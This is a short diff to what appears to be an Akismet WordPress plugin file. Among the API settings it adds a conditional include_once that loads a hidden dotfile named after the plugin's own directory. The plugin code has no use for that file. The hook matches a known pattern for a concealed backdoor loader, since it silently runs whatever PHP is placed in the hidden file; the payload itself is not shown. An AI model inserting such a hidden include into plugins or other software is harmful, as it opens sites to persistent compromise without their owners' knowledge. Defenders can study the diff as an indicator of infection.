@@ -6,6 +6,10 @@ $wpcom_api_key    = defined( 'WPCOM_API_KEY' ) ? constant( 'WPCOM_API_KEY' ) : '
 $akismet_api_host = Akismet::get_api_key() . '.rest.akismet.com';
 $akismet_api_port = 80;
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function akismet_test_mode() {
 	return Akismet::is_test_mode();
 }
